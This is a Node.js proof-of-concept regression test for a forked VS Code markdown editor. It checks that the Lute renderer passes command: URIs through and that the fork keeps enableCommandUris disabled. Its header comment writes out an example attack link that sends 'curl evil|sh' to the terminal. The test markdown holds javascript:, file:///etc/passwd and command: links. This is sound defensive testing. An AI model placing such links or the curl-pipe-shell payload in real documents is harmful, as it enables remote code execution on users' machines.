#!/usr/bin/env node
/**
 * PoC H2 — RCE via crafted markdown `command:` URI
 *
 * Threat model:
 *   User has markdown-editor-hardened installed. User opens a markdown file
 *   from an untrusted source (downloaded, attachment, cloned repo) in the
 *   COMMAND-MODE panel (Ctrl/Cmd+Shift+Alt+M or context menu "Open with
 *   markdown editor"). The .md contains a link like
 *     [click me](command:workbench.action.terminal.sendSequence?{"text":"curl evil|sh\n"})
 *   User clicks. In upstream's 0.1.13 with `enableCommandUris: true`, this
 *   dispatches the command verbatim — RCE.
 *
 * Substrate fact:
 *   vditor's markdown sanitizer (Lute, with SetSanitize(true) which is the
 *   default) does NOT strip `command:` URIs from rendered <a> hrefs. This
 *   is invariant of the extension's configuration — it's a property of the
 *   underlying markdown engine.
 *
 * Fork fix property:
 *   `EditorPanel.getWebviewOptions()` in src/extension.ts does NOT set
 *   `enableCommandUris: true`. (Default is false; clicked command: URIs
 *   are inert.)
 *
 * Verified in fork by:
 *   - Part A (substrate demo): drive Lute directly with the malicious markdown,
 *     assert `<a href="command:...">` survives in the rendered HTML
 *   - Part B (fix property): source-grep src/extension.ts for
 *     `enableCommandUris: true`, assert NOT FOUND
 *
 * Cache:
 *   Lute JS is cached at tests/fixtures/lute-3.8.4.min.js (gitignored).
 *   Fetched on first run from cdn.jsdelivr.net/npm/vditor@3.8.4/dist/js/lute/lute.min.js
 */

const { JSDOM } = require('jsdom');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

const FIXTURES = path.join(__dirname, '..', 'fixtures');
const LUTE_URL_3_8_4 = 'https://cdn.jsdelivr.net/npm/vditor@3.8.4/dist/js/lute/lute.min.js';
const LUTE_CACHE_3_8_4 = path.join(FIXTURES, 'lute-3.8.4.min.js');
const EXTENSION_TS = path.join(__dirname, '..', '..', 'src', 'extension.ts');

const TEST_MARKDOWN = [
  '# H2 PoC',
  '',
  // The simplest reachable command. Real attack payloads use commands like',
  // `workbench.action.terminal.sendSequence?text=...` to inject shell text;',
  // we use `workbench.action.openSettings` here because it is INNOCUOUS in',
  // itself but proves the dispatch primitive is reachable (any command would',
  // work — VS Code does no allowlist on `enableCommandUris: true`).',
  '[innocuous demo](command:workbench.action.openSettings)',
  '',
  '[also vulnerable](command:workbench.action.terminal.new)',
  '',
  // Reference: javascript: was stripped by Lute in vditor 3.11.2 but NOT in
  // 3.8.4 (which is what upstream pins). Included for completeness.
  '[js scheme](javascript:alert(1))',
  '',
  '[file](file:///etc/passwd)',
].join('\n');

async function fetchLute(url, cachePath) {
  if (!fs.existsSync(FIXTURES)) fs.mkdirSync(FIXTURES, { recursive: true });
  if (fs.existsSync(cachePath)) {
    return fs.readFileSync(cachePath, 'utf8');
  }
  console.log(`[poc-h2] fetching ${url} (cache miss)`);
  const r = await fetch(url);
  if (!r.ok) throw new Error(`fetch ${url} → ${r.status}`);
  const text = await r.text();
  fs.writeFileSync(cachePath, text);
  return text;
}

function loadLute(luteJs) {
  const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
    runScripts: 'dangerously',
    resources: 'usable',
  });
  dom.window.eval(luteJs);
  if (typeof dom.window.Lute === 'undefined') {
    throw new Error('Lute global not defined after script load');
  }
  return dom.window.Lute;
}

async function partA_substrateDemo() {
  console.log('\n[poc-h2 part A] Lute substrate demo — does Lute 3.8.4 strip command: URIs?');
  const luteJs = await fetchLute(LUTE_URL_3_8_4, LUTE_CACHE_3_8_4);
  const Lute = loadLute(luteJs);
  const lute = Lute.New();
  lute.SetSanitize(true); // vditor default

  const rendered = lute.Md2HTML(TEST_MARKDOWN);
  console.log('  rendered:');
  console.log(rendered.split('\n').map(l => '    ' + l).join('\n'));

  const checks = {
    'command: URI substring survives in rendered HTML': rendered.includes('command:workbench.action.openSettings'),
    'href="command:..." rendered as <a href>': /<a\s+href="command:[^"]+">/.test(rendered),
  };

  let partAPasses = 0;
  for (const [k, v] of Object.entries(checks)) {
    const tag = v ? '✓ DEMONSTRATED' : '✗ unexpected';
    console.log(`  ${tag}: ${k}`);
    if (v) partAPasses++;
  }

  if (partAPasses < Object.keys(checks).length) {
    console.log('[poc-h2 part A] NOTE: Lute behavior CHANGED — command: URIs are no longer rendered as <a> tags.');
    console.log('  This is NOT a regression in this fork. It means the substrate has self-corrected.');
    console.log('  The fix property in part B is still required (defense in depth).');
    return { status: 'substrate-changed', critical: false };
  }
  console.log('[poc-h2 part A] vulnerability is reachable in the substrate — fix property must hold');
  return { status: 'vulnerable-as-expected', critical: false };
}

function partB_forkFixProperty() {
  console.log('\n[poc-h2 part B] fork fix property — enableCommandUris must NOT be true in src/extension.ts');
  if (!fs.existsSync(EXTENSION_TS)) {
    throw new Error(`extension.ts not found at ${EXTENSION_TS}`);
  }
  const source = fs.readFileSync(EXTENSION_TS, 'utf8');

  // Strip line comments and block comments before matching, so the explanatory
  // comment in the fix doesn't trigger a false positive.
  const stripped = source
    .replace(/\/\/.*$/gm, '')           // line comments
    .replace(/\/\*[\s\S]*?\*\//g, '');  // block comments

  const ACTIVE_PATTERN = /enableCommandUris\s*:\s*true/;
  const violation = ACTIVE_PATTERN.test(stripped);

  if (violation) {
    console.log('  ✗ FAIL: src/extension.ts contains `enableCommandUris: true` outside a comment');
    console.log('  This is a regression of the C1.2 fix. The H2 RCE chain is open.');
    return { status: 'regressed', critical: true };
  }
  console.log('  ✓ PASS: no active `enableCommandUris: true` in src/extension.ts');
  return { status: 'fix-property-holds', critical: false };
}

(async () => {
  let exitCode = 0;
  try {
    const partA = await partA_substrateDemo();
    const partB = partB_forkFixProperty();

    console.log('\n[poc-h2] summary:');
    console.log(`  part A: ${partA.status}${partA.critical ? ' (CRITICAL)' : ''}`);
    console.log(`  part B: ${partB.status}${partB.critical ? ' (CRITICAL)' : ''}`);

    if (partB.critical) exitCode = 1;
    if (partA.status === 'vulnerable-as-expected' && partB.status === 'fix-property-holds') {
      console.log('\n[poc-h2] OVERALL: PASS — substrate is vulnerable but our fork closes the chain');
    } else if (partA.status === 'substrate-changed' && partB.status === 'fix-property-holds') {
      console.log('\n[poc-h2] OVERALL: PASS — substrate self-corrected; our fix property still holds (defense in depth)');
    } else {
      console.log('\n[poc-h2] OVERALL: FAIL');
    }
  } catch (e) {
    console.error(`\n[poc-h2] ERROR: ${e.message}`);
    console.error(e.stack);
    exitCode = 2;
  }
  process.exit(exitCode);
})();
